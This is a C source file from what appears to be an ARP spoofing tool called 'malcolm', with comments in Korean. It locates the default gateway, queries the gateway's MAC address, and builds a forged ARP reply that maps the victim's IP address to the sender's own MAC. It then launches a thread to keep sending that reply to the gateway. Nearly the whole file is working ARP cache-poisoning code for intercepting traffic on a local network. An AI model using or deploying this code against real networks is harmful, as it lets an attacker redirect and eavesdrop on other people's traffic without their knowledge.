#include "malcolm.h"

void create_arp_request(unsigned char *buffer, const struct in_addr src_ip, const struct in_addr dest_ip,
                        unsigned char *src_mac)
{
  struct ethhdr    *eth_header = (struct ethhdr *)buffer;
  struct ether_arp *arp_header = (struct ether_arp *)(buffer + sizeof(struct ethhdr));

  // Ethernet 헤더 설정 (Broadcast)
  ft_memset(eth_header->h_dest, 0xff, ETH_ALEN); // Broadcast
  ft_memcpy(eth_header->h_source, src_mac, ETH_ALEN);
  eth_header->h_proto = htons(ETH_P_ARP);

  // ARP 헤더 설정
  arp_header->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);  // Ethernet
  arp_header->ea_hdr.ar_pro = htons(ETH_P_IP);      // IPv4
  arp_header->ea_hdr.ar_hln = ETH_ALEN;             // MAC 주소 길이
  arp_header->ea_hdr.ar_pln = IP_ADDR_LEN;          // IPv4 주소 길이
  arp_header->ea_hdr.ar_op  = htons(ARPOP_REQUEST); // ARP Request

  // ARP 패킷 필드 설정
  ft_memcpy(arp_header->arp_sha, src_mac, ETH_ALEN);
  ft_memcpy(arp_header->arp_spa, &src_ip, IP_ADDR_LEN);
  ft_memset(arp_header->arp_tha, 0x00, ETH_ALEN);
  ft_memcpy(arp_header->arp_tpa, &dest_ip, IP_ADDR_LEN);
}

void send_arp_request_packet_to_gateway(unsigned char *buffer, int buflen)
{
  struct sockaddr_ll dest_addr;

  create_arp_request(buffer, data.my_ipv4, data.gw_ipv4, data.my_mac);
  printf("gateway request packet!\n");
  if (DEBUG)
    print_arp_packet(buffer);
  ft_memset(&dest_addr, 0, sizeof(dest_addr));
  dest_addr.sll_family   = AF_PACKET;
  dest_addr.sll_protocol = htons(ETH_P_ARP);
  dest_addr.sll_ifindex  = data.if_index;
  dest_addr.sll_halen    = ETH_ALEN;
  ft_memset(dest_addr.sll_addr, 0xff, ETH_ALEN); // Broadcast
  if (sendto(data.sockfd, buffer, buflen, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) <= 0)
  {
    perror("sendto failed");
    exit(EXIT_FAILURE);
  }
  if (DEBUG)
    printf("gateway arp request send okay!!\n");
}

void make_gateway_arp_packet(unsigned char *buffer)
{
  struct ethhdr     *cur_eth = (struct ethhdr *)buffer;
  struct arp_packet *cur_arp = (struct arp_packet *)(buffer + sizeof(struct ethhdr));

  ft_memcpy(cur_eth->h_dest, data.gw_mac, sizeof(data.gw_mac));
  ft_memcpy(cur_eth->h_source, data.my_mac, sizeof(data.my_mac));
  ft_memcpy(cur_arp->target_ip, &data.gw_ipv4, sizeof(data.gw_ipv4));
  ft_memcpy(cur_arp->target_mac, data.gw_mac, sizeof(data.gw_mac));
  ft_memcpy(cur_arp->sender_ip, &data.target_ipv4, sizeof(data.target_ipv4));
  ft_memcpy(cur_arp->sender_mac, data.my_mac, sizeof(data.my_mac));
  cur_arp->hdr.ar_hrd = htons(1);
  cur_arp->hdr.ar_pro = htons(ETHERTYPE_IP);
  cur_arp->hdr.ar_hln = 6;
  cur_arp->hdr.ar_pln = 4;
  cur_arp->hdr.ar_op  = htons(ARPOP_REPLY);
}

static void get_gateway_ip()
{
  FILE         *fp = fopen("/proc/net/route", "r");
  char          line[256], iface[16];
  unsigned long dest, gateway;

  if (fp == NULL)
  {
    perror("fopen");
    return;
  }

  // 첫 번째 줄은 헤더, 건너뜁니다.
  fgets(line, sizeof(line), fp);

  while (fgets(line, sizeof(line), fp))
  {
    sscanf(line, "%15s %lx %lx", iface, &dest, &gateway);

    // dest가 0이면 기본 게이트웨이를 의미합니다.
    if (dest == 0 && ft_memcmp(iface, data.if_name, ft_strlen(iface)) == 0)
    {
      data.gw_ipv4.s_addr = gateway;
      printf("Interface: %s, Gateway: %s\n", iface, inet_ntoa(data.gw_ipv4));
      break;
    }
  }
  fclose(fp);
}

void send_gateway_arp_request_packet(unsigned char *buffer, int buflen)
{
  get_gateway_ip();
  send_arp_request_packet_to_gateway(buffer, buflen);
}

// INFO : Get gateway mac address and then send reply
void send_gateway_spoofing_packet(unsigned char *buffer, int buflen)
{
  pthread_t          tid;
  struct thread_arg *arg;

  make_gateway_arp_packet(buffer);
  arg         = malloc(sizeof(struct thread_arg));
  arg->buffer = malloc(buflen);
  ft_memcpy(arg->buffer, buffer, buflen);
  ft_memcpy(arg->mac, data.gw_mac, MAC_ADDR_LEN);
  arg->buflen = buflen;
  if (DEBUG)
  {
    printf("gateway spoofing packet!!\n");
    print_arp_packet(buffer);
  }
  // TODO : clone을 써 보기
  if (pthread_create(&tid, NULL, send_fake_arp_reply, (void *)arg) != 0)
  {
    perror("pthread_create failed");
    exit(EXIT_FAILURE);
  }
  if (pthread_detach(tid) != 0)
  {
    perror("pthread_detach failed");
    exit(EXIT_FAILURE);
  }
}
